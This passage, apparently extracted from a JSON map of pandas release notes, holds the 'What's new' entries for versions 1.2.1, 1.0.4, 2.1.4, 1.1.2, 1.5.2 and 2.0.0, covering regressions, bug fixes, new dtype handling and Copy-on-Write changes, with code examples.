[6]: df1 + df2\n    Out[6]:\n         a    b\n    0  NaN  NaN\n    1  3.0  7.0\n    2  NaN  NaN\n\nIn pandas 1.2.0, we refactored how NumPy ufuncs are called on DataFrames, and\nthis started to align the inputs first (:issue:`39184`), as happens in other\npandas operations and as it happens for ufuncs called on Series objects.\n\nFor pandas 1.2.1, we restored the previous behaviour to avoid a breaking\nchange, but the above example of ``np.add(df1, df2)`` with non-aligned inputs\nwill now to raise a warning, and a future pandas 2.0 release will start\naligning the inputs first (:issue:`39184`). Calling a NumPy ufunc on Series\nobjects (eg ``np.add(s1, s2)``) already aligns and continues to do so.\n\nTo avoid the warning and keep the current behaviour of ignoring the indices,\nconvert one of the arguments to a NumPy array:\n\n.. code-block:: ipython\n\n    In [7]: np.add(df1, np.asarray(df2))\n    Out[7]:\n       a  b\n    0  2  6\n    1  4  8\n\nTo obtain the future behaviour and silence the warning, you can align manually\nbefore passing the arguments to the ufunc:\n\n.. code-block:: ipython\n\n    In [8]: df1, df2 = df1.align(df2)\n    In [9]: np.add(df1, df2)\n    Out[9]:\n         a    b\n    0  NaN  NaN\n    1  3.0  7.0\n    2  NaN  NaN\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_121.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in :meth:`read_csv` with ``float_precision=\"high\"`` caused segfault or wrong parsing of long exponent strings. This resulted in a regression in some cases as the default for ``float_precision`` was changed in pandas 1.2.0 (:issue:`38753`)\n- Bug in :func:`read_csv` not closing an opened file handle when a ``csv.Error`` or ``UnicodeDecodeError`` occurred while initializing (:issue:`39024`)\n- Bug in :func:`pandas.testing.assert_index_equal` raising ``TypeError`` with ``check_order=False`` when :class:`Index` has mixed dtype (:issue:`39168`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_121.other:\n\nOther\n~~~~~\n\n- The deprecated attributes ``_AXIS_NAMES`` and ``_AXIS_NUMBERS`` of :class:`DataFrame` and :class:`Series` will no longer show up in ``dir`` or ``inspect.getmembers`` calls (:issue:`38740`)\n- Bumped minimum fastparquet version to 0.4.0 to avoid ``AttributeError`` from numba (:issue:`38344`)\n- Bumped minimum pymysql version to 0.8.1 to avoid test failures (:issue:`38344`)\n- Fixed build failure on MacOS 11 in Python 3.9.1 (:issue:`38766`)\n- Added reference to backwards incompatible ``check_freq`` arg of :func:`testing.assert_frame_equal` and :func:`testing.assert_series_equal` in :ref:`pandas 1.1.0 what's new <whatsnew_110.api_breaking.testing.check_freq>` (:issue:`34050`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_121.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.2.0..v1.2.1\n", "1.0.4": "\n.. _whatsnew_104:\n\nWhat's new in 1.0.4 (May 28, 2020)\n------------------------------------\n\nThese are the changes in pandas 1.0.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_104.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fix regression where :meth:`Series.isna` and :meth:`DataFrame.isna` would raise for categorical dtype when ``pandas.options.mode.use_inf_as_na`` was set to ``True`` (:issue:`33594`)\n- Fix regression in :meth:`.DataFrameGroupBy.first`, :meth:`.SeriesGroupBy.first`, :meth:`.DataFrameGroupBy.last`, and :meth:`.SeriesGroupBy.last` where None is not preserved in object dtype (:issue:`32800`)\n- Fix regression in DataFrame reductions using ``numeric_only=True`` and ExtensionArrays (:issue:`33256`).\n- Fix performance regression in ``memory_usage(deep=True)`` for object dtype (:issue:`33012`)\n- Fix regression where :meth:`Categorical.replace` would replace with ``NaN`` whenever the new value and replacement value were equal (:issue:`33288`)\n- Fix regression where an ordered :class:`Categorical` containing only ``NaN`` values would raise rather than returning ``NaN`` when taking the minimum or maximum  (:issue:`33450`)\n- Fix regression in :meth:`DataFrameGroupBy.agg` with dictionary input losing ``ExtensionArray`` dtypes (:issue:`32194`)\n- Fix to preserve the ability to index with the \"nearest\" method with xarray's CFTimeIndex, an :class:`Index` subclass (`pydata/xarray#3751 <https://github.com/pydata/xarray/issues/3751>`_, :issue:`32905`).\n- Fix regression in :meth:`DataFrame.describe` raising ``TypeError: unhashable type: 'dict'`` (:issue:`32409`)\n- Fix regression in :meth:`DataFrame.replace` casts columns to ``object`` dtype if items in ``to_replace`` not in values (:issue:`32988`)\n- Fix regression in :meth:`Series.groupby` would raise ``ValueError`` when grouping by :class:`PeriodIndex` level (:issue:`34010`)\n- Fix regression in :meth:`DataFrameGroupBy.rolling.apply` and :meth:`SeriesGroupBy.rolling.apply` ignoring args and kwargs parameters (:issue:`33433`)\n- Fix regression in error message with ``np.min`` or ``np.max`` on unordered :class:`Categorical` (:issue:`33115`)\n- Fix regression in :meth:`DataFrame.loc` and :meth:`Series.loc` throwing an error when a ``datetime64[ns, tz]`` value is provided (:issue:`32395`)\n\n.. _whatsnew_104.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :meth:`SeriesGroupBy.first`, :meth:`SeriesGroupBy.last`, :meth:`SeriesGroupBy.min`, and :meth:`SeriesGroupBy.max` returning floats when applied to nullable Booleans (:issue:`33071`)\n- Bug in :meth:`Rolling.min` and :meth:`Rolling.max`: Growing memory usage after multiple calls when using a fixed window (:issue:`30726`)\n- Bug in :meth:`~DataFrame.to_parquet` was not raising ``PermissionError`` when writing to a private s3 bucket with invalid creds. (:issue:`27679`)\n- Bug in :meth:`~DataFrame.to_csv` was silently failing when writing to an invalid s3 bucket. (:issue:`32486`)\n- Bug in :meth:`read_parquet` was raising a ``FileNotFoundError`` when passed an s3 directory path. (:issue:`26388`)\n- Bug in :meth:`~DataFrame.to_parquet` was throwing an ``AttributeError`` when writing a partitioned parquet file to s3 (:issue:`27596`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` causes the quantiles to be shifted when the ``by`` axis contains ``NaN`` (:issue:`33200`, :issue:`33569`)\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.0.3..v1.0.4\n", "2.1.4": ".. _whatsnew_214:\n\nWhat's new in 2.1.4 (December 8, 2023)\n---------------------------------------\n\nThese are the changes in pandas 2.1.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_214.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression when trying to read a pickled pandas :class:`DataFrame` from pandas 1.3 (:issue:`55137`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_214.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :class:`Series` constructor raising DeprecationWarning when ``index`` is a list of :class:`Series` (:issue:`55228`)\n- Bug in :class:`Series` when trying to cast date-like string inputs to :class:`ArrowDtype` of ``pyarrow.timestamp`` (:issue:`56266`)\n- Bug in :class:`Timestamp` construction with ``ts_input=\"now\"`` or ``ts_input=\"today\"`` giving a different unit from :meth:`Timestamp.now` or :meth:`Timestamp.today` (:issue:`55879`)\n- Bug in :meth:`Index.__getitem__` returning wrong result for Arrow dtypes and negative stepsize (:issue:`55832`)\n- Fixed bug in :func:`read_csv` not respecting object dtype when ``infer_string`` option is set (:issue:`56047`)\n- Fixed bug in :func:`to_numeric` converting to extension dtype for ``string[pyarrow_numpy]`` dtype (:issue:`56179`)\n- Fixed bug in :meth:`.DataFrameGroupBy.min` and :meth:`.DataFrameGroupBy.max` not preserving extension dtype for empty object (:issue:`55619`)\n- Fixed bug in :meth:`DataFrame.__setitem__` casting :class:`Index` with object-dtype to PyArrow backed strings when ``infer_string`` option is set (:issue:`55638`)\n- Fixed bug in :meth:`DataFrame.to_hdf` raising when columns have ``StringDtype`` (:issue:`55088`)\n- Fixed bug in :meth:`Index.insert` casting object-dtype to PyArrow backed strings when ``infer_string`` option is set (:issue:`55638`)\n- Fixed bug in :meth:`Series.__ne__` resulting in False for comparison between ``NA`` and string value for ``dtype=\"string[pyarrow_numpy]\"`` (:issue:`56122`)\n- Fixed bug in :meth:`Series.mode` not keeping object dtype when ``infer_string`` is set (:issue:`56183`)\n- Fixed bug in :meth:`Series.reset_index` not preserving object dtype when ``infer_string`` is set (:issue:`56160`)\n- Fixed bug in :meth:`Series.str.split` and :meth:`Series.str.rsplit` when ``pat=None`` for :class:`ArrowDtype` with ``pyarrow.string`` (:issue:`56271`)\n- Fixed bug in :meth:`Series.str.translate` losing object dtype when string option is set (:issue:`56152`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_214.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.1.3..v2.1.4\n", "1.1.2": ".. _whatsnew_112:\n\nWhat's new in 1.1.2 (September 8, 2020)\n---------------------------------------\n\nThese are the changes in pandas 1.1.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_112.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Regression in :meth:`DatetimeIndex.intersection` incorrectly raising ``AssertionError`` when intersecting against a list (:issue:`35876`)\n- Fix regression in updating a column inplace (e.g. using ``df['col'].fillna(.., inplace=True)``) (:issue:`35731`)\n- Fix regression in :meth:`DataFrame.append` mixing tz-aware and tz-naive datetime columns (:issue:`35460`)\n- Performance regression for :meth:`RangeIndex.format` (:issue:`35712`)\n- Regression where :meth:`MultiIndex.get_loc` would return a slice spanning the full index when passed an empty list (:issue:`35878`)\n- Fix regression in invalid cache after an indexing operation; this can manifest when setting which does not update the data (:issue:`35521`)\n- Regression in :meth:`DataFrame.replace` where a ``TypeError`` would be raised when attempting to replace elements of type :class:`Interval` (:issue:`35931`)\n- Fix regression in pickle roundtrip of the ``closed`` attribute of :class:`IntervalIndex` (:issue:`35658`)\n- Fixed regression in :meth:`DataFrameGroupBy.agg` where a ``ValueError: buffer source array is read-only`` would be raised when the underlying array is read-only (:issue:`36014`)\n- Fixed regression in :meth:`Series.groupby.rolling` number of levels of :class:`MultiIndex` in input was compressed to one (:issue:`36018`)\n- Fixed regression in :class:`DataFrameGroupBy` on an empty :class:`DataFrame` (:issue:`36197`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_112.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :meth:`DataFrame.eval` with ``object`` dtype column binary operations (:issue:`35794`)\n- Bug in :class:`Series` constructor raising a ``TypeError`` when constructing sparse datetime64 dtypes (:issue:`35762`)\n- Bug in :meth:`DataFrame.apply` with ``result_type=\"reduce\"`` returning with incorrect index (:issue:`35683`)\n- Bug in :meth:`Series.astype` and :meth:`DataFrame.astype` not respecting the ``errors`` argument when set to ``\"ignore\"`` for extension dtypes (:issue:`35471`)\n- Bug in :meth:`DateTimeIndex.format` and :meth:`PeriodIndex.format` with ``name=True`` setting the first item to ``\"None\"`` where it should be ``\"\"`` (:issue:`35712`)\n- Bug in :meth:`Float64Index.__contains__` incorrectly raising ``TypeError`` instead of returning ``False`` (:issue:`35788`)\n- Bug in :class:`Series` constructor incorrectly raising a ``TypeError`` when passed an ordered set (:issue:`36044`)\n- Bug in :meth:`Series.dt.isocalendar` and :meth:`DatetimeIndex.isocalendar` that returned incorrect year for certain dates (:issue:`36032`)\n- Bug in :class:`DataFrame` indexing returning an incorrect :class:`Series` in some cases when the series has been altered and a cache not invalidated (:issue:`33675`)\n- Bug in :meth:`DataFrame.corr` causing subsequent indexing lookups to be incorrect (:issue:`35882`)\n- Bug in :meth:`import_optional_dependency` returning incorrect package names in cases where package name is different from import name (:issue:`35948`)\n- Bug when setting empty :class:`DataFrame` column to a :class:`Series` in preserving name of index in frame (:issue:`31368`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_112.other:\n\nOther\n~~~~~\n- :meth:`factorize` now supports ``na_sentinel=None`` to include NaN in the uniques of the values and remove ``dropna`` keyword which was unintentionally exposed to public facing API in 1.1 version from :meth:`factorize` (:issue:`35667`)\n- :meth:`DataFrame.plot` and :meth:`Series.plot` raise ``UserWarning`` about usage of ``FixedFormatter`` and ``FixedLocator`` (:issue:`35684` and :issue:`35945`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_112.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.1..v1.1.2\n", "1.5.2": ".. _whatsnew_152:\n\nWhat's new in 1.5.2 (November 21, 2022)\n---------------------------------------\n\nThese are the changes in pandas 1.5.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_152.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`MultiIndex.join` for extension array dtypes (:issue:`49277`)\n- Fixed regression in :meth:`Series.replace` raising ``RecursionError`` with numeric dtype and when specifying ``value=None`` (:issue:`45725`)\n- Fixed regression in arithmetic operations for :class:`DataFrame` with :class:`MultiIndex` columns with different dtypes (:issue:`49769`)\n- Fixed regression in :meth:`DataFrame.plot` preventing :class:`~matplotlib.colors.Colormap` instance\n  from being passed using the ``colormap`` argument if Matplotlib 3.6+ is used (:issue:`49374`)\n- Fixed regression in :func:`date_range` returning an invalid set of periods for ``CustomBusinessDay`` frequency and ``start`` date with timezone (:issue:`49441`)\n- Fixed performance regression in groupby operations (:issue:`49676`)\n- Fixed regression in :class:`Timedelta` constructor returning object of wrong type when subclassing ``Timedelta`` (:issue:`49579`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_152.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in the Copy-on-Write implementation losing track of views in certain chained indexing cases (:issue:`48996`)\n- Fixed memory leak in :meth:`.Styler.to_excel` (:issue:`49751`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_152.other:\n\nOther\n~~~~~\n- Reverted ``color`` as an alias for ``c`` and ``size`` as an alias for ``s`` in function :meth:`DataFrame.plot.scatter` (:issue:`49732`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_152.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.5.1..v1.5.2\n", "2.0.0": ".. _whatsnew_200:\n\nWhat's new in 2.0.0 (April 3, 2023)\n-----------------------------------\n\nThese are the changes in pandas 2.0.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_200.enhancements.optional_dependency_management_pip:\n\nInstalling optional dependencies with pip extras\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nWhen installing pandas using pip, sets of optional dependencies can also be installed by specifying extras.\n\n.. code-block:: bash\n\n  pip install \"pandas[performance, aws]>=2.0.0\"\n\nThe available extras, found in the :ref:`installation guide<install.dependencies>`, are\n``[all, performance, computation, fss, aws, gcp, excel, parquet, feather, hdf5, spss, postgresql, mysql,\nsql-other, html, xml, plot, output_formatting, clipboard, compression, test]`` (:issue:`39164`).\n\n.. _whatsnew_200.enhancements.index_can_hold_numpy_numeric_dtypes:\n\n:class:`Index` can now hold numpy numeric dtypes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIt is now possible to use any numpy numeric dtype in a :class:`Index` (:issue:`42717`).\n\nPreviously it was only possible to use ``int64``, ``uint64`` & ``float64`` dtypes:\n\n.. code-block:: ipython\n\n    In [1]: pd.Index([1, 2, 3], dtype=np.int8)\n    Out[1]: Int64Index([1, 2, 3], dtype=\"int64\")\n    In [2]: pd.Index([1, 2, 3], dtype=np.uint16)\n    Out[2]: UInt64Index([1, 2, 3], dtype=\"uint64\")\n    In [3]: pd.Index([1, 2, 3], dtype=np.float32)\n    Out[3]: Float64Index([1.0, 2.0, 3.0], dtype=\"float64\")\n\n:class:`Int64Index`, :class:`UInt64Index` & :class:`Float64Index` were deprecated in pandas\nversion 1.4 and have now been removed. Instead :class:`Index` should be used directly, and\ncan it now take all numpy numeric dtypes, i.e.\n``int8``/ ``int16``/``int32``/``int64``/``uint8``/``uint16``/``uint32``/``uint64``/``float32``/``float64`` dtypes:\n\n.. ipython:: python\n\n    pd.Index([1, 2, 3], dtype=np.int8)\n    pd.Index([1, 2, 3], dtype=np.uint16)\n    pd.Index([1, 2, 3], dtype=np.float32)\n\nThe ability for :class:`Index` to hold the numpy numeric dtypes has meant some changes in Pandas\nfunctionality. In particular, operations that previously were forced to create 64-bit indexes,\ncan now create indexes with lower bit sizes, e.g. 32-bit indexes.\n\nBelow is a possibly non-exhaustive list of changes:\n\n1. Instantiating using a numpy numeric array now follows the dtype of the numpy array.\n   Previously, all indexes created from numpy numeric arrays were forced to 64-bit. Now,\n   for example, ``Index(np.array([1, 2, 3]))`` will be ``int32`` on 32-bit systems, where\n   it previously would have been ``int64`` even on 32-bit systems.\n   Instantiating :class:`Index` using a list of numbers will still return 64bit dtypes,\n   e.g. ``Index([1, 2, 3])`` will have a ``int64`` dtype, which is the same as previously.\n2. The various numeric datetime attributes of :class:`DatetimeIndex` (:attr:`~DatetimeIndex.day`,\n   :attr:`~DatetimeIndex.month`, :attr:`~DatetimeIndex.year` etc.) were previously in of\n   dtype ``int64``, while they were ``int32`` for :class:`arrays.DatetimeArray`. They are now\n   ``int32`` on :class:`DatetimeIndex` also:\n\n   .. ipython:: python\n\n       idx = pd.date_range(start='1/1/2018', periods=3, freq='ME')\n       idx.array.year\n       idx.year\n\n3. Level dtypes on Indexes from :meth:`Series.sparse.from_coo` are now of dtype ``int32``,\n   the same as they are on the ``rows``/``cols`` on a scipy sparse matrix. Previously they\n   were of dtype ``int64``.\n\n   .. ipython:: python\n\n       from scipy import sparse\n       A = sparse.coo_matrix(\n           ([3.0, 1.0, 2.0], ([1, 0, 0], [0, 2, 3])), shape=(3, 4)\n       )\n       ser = pd.Series.sparse.from_coo(A)\n       ser.index.dtypes\n\n4. :class:`Index` cannot be instantiated using a float16 dtype. Previously instantiating\n   an :class:`Index` using dtype ``float16`` resulted in a :class:`Float64Index` with a\n   ``float64`` dtype. It now raises a ``NotImplementedError``:\n\n   .. ipython:: python\n       :okexcept:\n\n       pd.Index([1, 2, 3], dtype=np.float16)\n\n\n.. _whatsnew_200.enhancements.io_dtype_backend:\n\nArgument ``dtype_backend``, to return pyarrow-backed or numpy-backed nullable dtypes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe following functions gained a new keyword ``dtype_backend`` (:issue:`36712`)\n\n* :func:`read_csv`\n* :func:`read_clipboard`\n* :func:`read_fwf`\n* :func:`read_excel`\n* :func:`read_html`\n* :func:`read_xml`\n* :func:`read_json`\n* :func:`read_sql`\n* :func:`read_sql_query`\n* :func:`read_sql_table`\n* :func:`read_parquet`\n* :func:`read_orc`\n* :func:`read_feather`\n* :func:`read_spss`\n* :func:`to_numeric`\n* :meth:`DataFrame.convert_dtypes`\n* :meth:`Series.convert_dtypes`\n\nWhen this option is set to ``\"numpy_nullable\"`` it will return a :class:`DataFrame` that is\nbacked by nullable dtypes.\n\nWhen this keyword is set to ``\"pyarrow\"``, then these functions will return pyarrow-backed nullable :class:`ArrowDtype` DataFrames (:issue:`48957`, :issue:`49997`):\n\n* :func:`read_csv`\n* :func:`read_clipboard`\n* :func:`read_fwf`\n* :func:`read_excel`\n* :func:`read_html`\n* :func:`read_xml`\n* :func:`read_json`\n* :func:`read_sql`\n* :func:`read_sql_query`\n* :func:`read_sql_table`\n* :func:`read_parquet`\n* :func:`read_orc`\n* :func:`read_feather`\n* :func:`read_spss`\n* :func:`to_numeric`\n* :meth:`DataFrame.convert_dtypes`\n* :meth:`Series.convert_dtypes`\n\n.. ipython:: python\n\n    import io\n    data = io.StringIO(\"\"\"a,b,c,d,e,f,g,h,i\n        1,2.5,True,a,,,,,\n        3,4.5,False,b,6,7.5,True,a,\n    \"\"\")\n    df = pd.read_csv(data, dtype_backend=\"pyarrow\")\n    df.dtypes\n\n    data.seek(0)\n    df_pyarrow = pd.read_csv(data, dtype_backend=\"pyarrow\", engine=\"pyarrow\")\n    df_pyarrow.dtypes\n\nCopy-on-Write improvements\n^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- A new lazy copy mechanism that defers the copy until the object in question is modified\n  was added to the methods listed in\n  :ref:`Copy-on-Write optimizations <copy_on_write.optimizations>`.\n  These methods return views when Copy-on-Write is enabled, which provides a significant\n  performance improvement compared to the regular execution (:issue:`49473`).\n\n- Accessing a single column of a DataFrame as a Series (e.g. ``df[\"col\"]``) now always\n  returns a new object every time it is constructed when Copy-on-Write is enabled (not\n  returning multiple times an identical, cached Series object). This ensures that those\n  Series objects correctly follow the Copy-on-Write rules (:issue:`49450`)\n\n- The :class:`Series` constructor will now create a lazy copy (deferring the copy until\n  a modification to the data happens) when constructing a Series from an existing\n  Series with the default of ``copy=False`` (:issue:`50471`)\n\n- The :class:`DataFrame` constructor will now create a lazy copy (deferring the copy until\n  a modification to the data happens) when constructing from an existing\n  :class:`DataFrame` with the default of ``copy=False`` (:issue:`51239`)\n\n- The :class:`DataFrame` constructor, when constructing a DataFrame from a dictionary\n  of Series objects and specifying ``copy=False``, will now use a lazy copy\n  of those Series objects for the columns of the DataFrame (:issue:`50777`)\n\n- The :class:`DataFrame` constructor, when constructing a DataFrame from a\n  :class:`Series` or :class:`Index` and specifying ``copy=False``, will\n  now respect Copy-on-Write.\n\n- The :class:`DataFrame` and :class:`Series` constructors, when constructing from\n  a NumPy array, will now copy the array by default to avoid mutating\n  the :class:`DataFrame` / :class:`Series`\n  when mutating the array. Specify ``copy=False`` to get the old behavior.\n  When setting ``copy=False`` pandas does not guarantee correct Copy-on-Write\n  behavior when the NumPy array is modified after creation of the\n  :class:`DataFrame` / :class:`Series`.\n\n- The :meth:`DataFrame.from_records` will now respect Copy-on-Write when called\n  with a :class:`DataFrame`.\n\n- Trying to set values using chained assignment (for example, ``df[\"a\"][1:3] = 0``)\n  will now always raise a warning when Copy-on-Write is enabled. In this mode,\n  chained assignment can never work because we are always setting into a temporary\n  object that is the result of an indexing operation (getitem), which under\n  Copy-on-Write always behaves as a copy. Thus, assigning through a chain\n  can never update the original Series or DataFrame. Therefore, an informative\n  warning is raised to the user to avoid silently doing nothing (:issue:`49467`)\n\n- :meth:`DataFrame.replace` will now respect the Copy-on-Write mechanism\n  when ``inplace=True``.\n\n- :meth:`DataFrame.transpose` will now respect the Copy-on-Write mechanism.\n\n- Arithmetic operations that can be inplace, e.g. ``ser *= 2`` will now respect the\n  Copy-on-Write mechanism.\n\n- :meth:`DataFrame.__getitem__` will now respect the Copy-on-Write mechanism when the\n  :class:`DataFrame` has :class:`MultiIndex` columns.\n\n- :meth:`Series.__getitem__` will now respect the Copy-on-Write mechanism when the\n   :class:`Series` has a :class:`MultiIndex`.\n\n- :meth:`Series.view` will now respect the Copy-on-Write mechanism.\n\nCopy-on-Write can be enabled through one of\n\n.. code-block:: python\n\n    pd.set_option(\"mode.copy_on_write\", True)\n\n\n.. code-block:: python\n\n    pd.options.mode.copy_on_write = True\n\nAlternatively, copy on write can be enabled locally through:\n\n.. code-block:: python\n\n    with pd.option_context(\"mode.copy_on_write\", True):\n        ...\n\n.. _whatsnew_200.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n- Added support for ``str`` accessor methods when using :class:`ArrowDtype`  with a ``pyarrow.string`` type (:issue:`50325`)\n- Added support for ``dt`` accessor methods when using :class:`ArrowDtype` with a ``pyarrow.timestamp`` type (:issue:`50954`)\n- :func:`read_sas` now supports using ``encoding='infer'`` to correctly read and use the encoding specified by the sas file. (:issue:`48048`)\n- :meth:`.DataFrameGroupBy.quantile`, :meth:`.SeriesGroupBy.quantile` and :meth:`.DataFrameGroupBy.std` now preserve nullable dtypes instead of casting to numpy dtypes (:issue:`37493`)\n- :meth:`.DataFrameGroupBy.std`, :meth:`.SeriesGroupBy.std` now support datetime64, timedelta64, and :class:`DatetimeTZDtype` dtypes (:issue:`48481`)\n- :meth:`Series.add_suffix`, :meth:`DataFrame.add_suffix`, :meth:`Series.add_prefix` and :meth:`DataFrame.add_prefix` support an ``axis`` argument. If ``axis`` is set, the default behaviour of which axis to consider can be overwritten (:issue:`47819`)\n- :func:`.testing.assert_frame_equal` now shows the first element where the DataFrames differ, analogously to ``pytest``'s output (:issue:`47910`)\n- Added ``index`` parameter to :meth:`DataFrame.to_dict` (:issue:`46398`)\n- Added support for extension array dtypes in :func:`merge` (:issue:`44240`)\n- Added metadata propagation for binary operators on :class:`DataFrame` (:issue:`28283`)\n- Added ``cumsum``, ``cumprod``, ``cummin`` and ``cummax`` to the ``ExtensionArray`` interface via ``_accumulate`` (:issue:`28385`)\n- :class:`.CategoricalConversionWarning`, :class:`.InvalidComparison`, :class:`.InvalidVersion`, :class:`.LossySetitemError`, and :class:`.NoBufferPresent` are now exposed in ``pandas.errors`` (:issue:`27656`)\n- Fix ``test`` optional_extra by adding missing test package ``pytest-asyncio`` (:issue:`48361`)\n- :func:`DataFrame.astype` exception message thrown improved to include column name when type conversion is not possible. (:issue:`47571`)\n- :func:`date_range` now supports a ``unit`` keyword (\"s\", \"ms\", \"us\", or \"ns\") to specify the desired resolution of the output index (:issue:`49106`)\n- :func:`timedelta_range` now supports a ``unit`` keyword (\"s\", \"ms\", \"us\", or \"ns\") to specify the desired resolution of the output index (:issue:`49824`)\n- :meth:`DataFrame.to_json` now supports a ``mode`` keyword with supported inputs 'w' and 'a'. Defaulting to 'w', 'a' can be used when lines=True and orient='records' to append record oriented json lines to an existing json file. (:issue:`35849`)\n- Added ``name`` parameter to :meth:`IntervalIndex.from_breaks`, :meth:`IntervalIndex.from_arrays` and :meth:`IntervalIndex.from_tuples` (:issue:`48911`)\n- Improve exception message when using :func:`.testing.assert_frame_equal` on a :class:`DataFrame` to include the column that is compared (:issue:`50323`)\n- Improved error message for :func:`merge_asof` when join-columns were duplicated (:issue:`50102`)\n- Added support for extension array dtypes to :func:`get_dummies` (:issue:`32430`)\n- Added :meth:`Index.infer_objects` analogous to :meth:`Series.infer_objects` (:issue:`50034`)\n- Added ``copy`` parameter to :meth:`Series.infer_objects` and :meth:`DataFrame.infer_objects`, passing ``False`` will avoid making copies for series or columns that are already non-object or where no better dtype can be inferred (:issue:`50096`)\n- :meth:`DataFrame.plot.hist` now recognizes ``xlabel`` and ``ylabel`` arguments (:issue:`49793`)\n- :meth:`Series.drop_duplicates` has gained ``ignore_index`` keyword to reset index (:issue:`48304`)\n- :meth:`Series.dropna` and :meth:`DataFrame.dropna` has gained ``ignore_index`` keyword to reset index (:issue:`31725`)\n- Improved error message in :func:`to_datetime` for non-ISO8601 formats, informing users about the position of the first error (:issue:`50361`)\n- Improved error message when trying to align :class:`DataFrame` objects (for example, in :func:`DataFrame.compare`) to clarify that \"identically labelled\" refers to both index and columns (:issue:`50083`)\n- Added support for :meth:`Index.min` and :meth:`Index.max` for pyarrow string dtypes (:issue:`51397`)\n- Added :meth:`DatetimeIndex.as_unit` and :meth:`TimedeltaIndex.as_unit` to convert to different resolutions; supported resolutions are \"s\", \"ms\", \"us\", and \"ns\" (:issue:`50616`)\n- Added :meth:`Series.dt.unit` and :meth:`Series.dt.as_unit` to convert to different resolutions; supported resolutions are \"s\", \"ms\", \"us\", and \"ns\" (:issue:`51223`)\n- Added new argument ``dtype`` to :func:`read_sql` to be consistent with :func:`read_sql_query` (:issue:`50797`)\n- :func:`read_csv`, :func:`read_table`, :func:`read_fwf` and :func:`read_excel` now accept ``date_format`` (:issue:`50601`)\n- :func:`to_datetime` now accepts ``\"ISO8601\"`` as an argument to ``format``, which will match any ISO8601 string (but possibly not identically-formatted) (:issue:`50411`)\n- :func:`to_datetime` now accepts ``\"mixed\"`` as an argument to ``format``, which will infer the format for each element individually (:issue:`50972`)\n- Added new argument ``engine`` to :func:`read_json` to support parsing JSON with pyarrow by specifying ``engine=\"pyarrow\"`` (:issue:`48893`)\n- Added support for SQLAlchemy 2.0 (:issue:`40686`)\n- Added support for ``decimal`` parameter when ``engine=\"pyarrow\"`` in :func:`read_csv` (:issue:`51302`)\n- :class:`Index` set operations :meth:`Index.union`, :meth:`Index.intersection`, :meth:`Index.difference`, and :meth:`Index.symmetric_difference` now support ``sort=True``, which will always return a sorted result, unlike the default ``sort=None`` which does not sort in some cases (:issue:`25151`)\n- Added new escape mode \"latex-math\" to avoid escaping \"$\" in formatter (:issue:`50040`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\n.. _whatsnew_200.notable_bug_fixes.cumsum_cumprod_overflow:\n\n:meth:`.DataFrameGroupBy.cumsum` and :meth:`.DataFrameGroupBy.cumprod` overflow instead of lossy casting to float\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions we cast to float when applying ``cumsum`` and ``cumprod`` which\nlead to incorrect results even if the result could be hold by ``int64`` dtype.\nAdditionally, the aggregation overflows consistent with numpy and the regular\n:meth:`DataFrame.cumprod` and :meth:`DataFrame.cumsum` methods when the limit of\n``int64`` is reached (:issue:`37493`).\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [1]: df = pd.DataFrame({\"key\": [\"b\"] 